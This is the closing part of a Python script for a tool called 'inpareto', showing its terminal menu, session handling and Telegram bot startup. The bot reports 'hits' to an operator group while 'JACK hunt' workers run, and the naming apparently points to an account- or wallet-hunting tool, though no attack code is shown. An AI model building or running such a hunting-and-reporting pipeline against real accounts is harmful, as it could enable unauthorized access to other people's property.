            shutdown_joint_session(via_menu=True)
        invalidate_operator_gate_cache()
        need_refresh = True
    _session_awaiting_verification = False
    _terminal_notice_signature = ""
    mark_operator_access_verified()
    start_hunt_workers()
    if _headless_vps_mode():
        print(
            apply_color(
                "\n  ▸ Headless VPS — hunt workers running (INPARETO_HEADLESS=1)\n"
                "  ▸ Logs: pm2 logs inpareto-joint · Telegram: /stats /pause /resume\n",
                ANSI_GREEN,
            )
        )
        try:
            while True:
                time.sleep(3600)
        except KeyboardInterrupt:
            shutdown_joint_session()
        return
    render_session_ready_menu()
    while True:
        choice = premium_input("Menu", TERMINAL_MENU_HINT).lower()
        if choice in ("1", "panel", "jack", "start", "live"):
            run_live_jack_panel()
            render_session_ready_menu()
        elif choice in ("2", "status", "snap", "s"):
            global DASHBOARD_SHOW_LOGO
            DASHBOARD_SHOW_LOGO = True
            draw_dashboard()
            print(
                apply_color(
                    "\n  Snapshot shown — Enter for menu · l=logout · q=quit\n",
                    ANSI_DIM,
                )
            )
            try:
                input(apply_color("    › ", ANSI_YELLOW))
            except EOFError:
                pass
            print()
            render_session_ready_menu()
        elif choice in ("l", "logout", "out", "log out"):
            if terminal_execute_logout():
                return "logged_out"
            render_session_ready_menu()
        elif choice in ("q", "quit", "exit", "stop"):
            shutdown_joint_session(via_menu=True)
        else:
            print(apply_color("  Unknown option — try 1, 2, l, or q", ANSI_YELLOW))


def _telegram_startup_sequence():
    """Welcome panel only when verified — terminal verify screen handles the rest."""
    try:
        reconcile_operator_hit_group()
        sync_operator_access()
        schedule_sync_telegram_commands(TELEGRAM_CHAT_ID)
        if operator_access_ok(force=True):
            mark_operator_access_verified()
        hg_ok, _ = operator_hit_group_access_state(force=True)
        if hg_ok:
            send_startup_message()
        else:
            reply_hit_group_required()
    except Exception as exc:
        log_event("TG BOOT", str(exc)[:100])


def _telegram_monitor_bootstrap():
    """Poll is already live; only quick webhook clear + settings, then background startup."""
    try:
        ensure_telegram_polling_mode()
        admin_load_settings()
        if TELEGRAM_CHAT_ID:
            schedule_sync_telegram_commands(TELEGRAM_CHAT_ID)
        threading.Thread(target=_telegram_startup_sequence, daemon=True).start()
    except Exception as exc:
        log_event("TG BOOT", str(exc)[:100])


def start_telegram_monitor():
    global _telegram_monitor_started
    if not TELEGRAM_ENABLED or _telegram_monitor_started:
        return
    _telegram_monitor_started = True
    threading.Thread(target=poll_telegram_updates, daemon=True, name="tg-poll").start()
    threading.Thread(target=live_watch_loop, daemon=True).start()
    threading.Thread(target=access_sync_loop, daemon=True).start()
    threading.Thread(target=_telegram_monitor_bootstrap, daemon=True).start()
    start_hit_tg_retry_monitor()


try:
    configure_telegram()
    start_health_monitor()
    threading.Thread(target=_warmup_probes_once, daemon=True).start()
    threading.Thread(target=profile_init_on_startup, daemon=True).start()
    start_telegram_monitor()
    apply_worker_pause_state(defer_access=True)

    _session_exit = run_session_menu_loop()
    if _session_exit == "logged_out":
        print(apply_color("\n  ▸ Logged out — run python joint.py to link again.\n", ANSI_DIM))
        sys.exit(0)

    # Unreachable if menu returns normally — q calls shutdown_joint_session().
    if not _workers_started:
        start_hunt_workers()

    print(
        apply_color(
            "\n  ▸ JACK hunt running · Ctrl+C to stop\n",
            ANSI_GREEN,
        )
    )
    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        shutdown_joint_session()
except KeyboardInterrupt:
    shutdown_joint_session()


# If this gives you goosebumps, you're already behind because you'll need more brains than courage to compete with me.